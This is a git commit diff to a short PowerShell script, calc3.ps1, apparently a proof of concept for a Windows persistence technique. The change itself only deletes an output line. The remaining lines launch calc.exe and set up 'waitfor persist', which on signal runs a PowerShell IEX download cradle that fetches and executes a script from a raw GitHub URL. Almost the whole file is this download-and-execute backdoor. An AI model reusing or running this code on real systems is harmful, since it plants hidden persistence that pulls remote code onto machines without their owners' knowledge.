1ee92f2fd6a4ff2ee968645e81fa33af0a3bed98
3gstudent <robertpetersen@outlook.com>
2017-06-06 20:32:06 -0700

    Update calc3.ps1

--- calc3.ps1
+++ calc3.ps1
@@ -1,4 +1,3 @@
 $example_code = start-process calc.exe;
-Write-Host $example_code -ForegroundColor Green;
 $example_code;
 cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1');
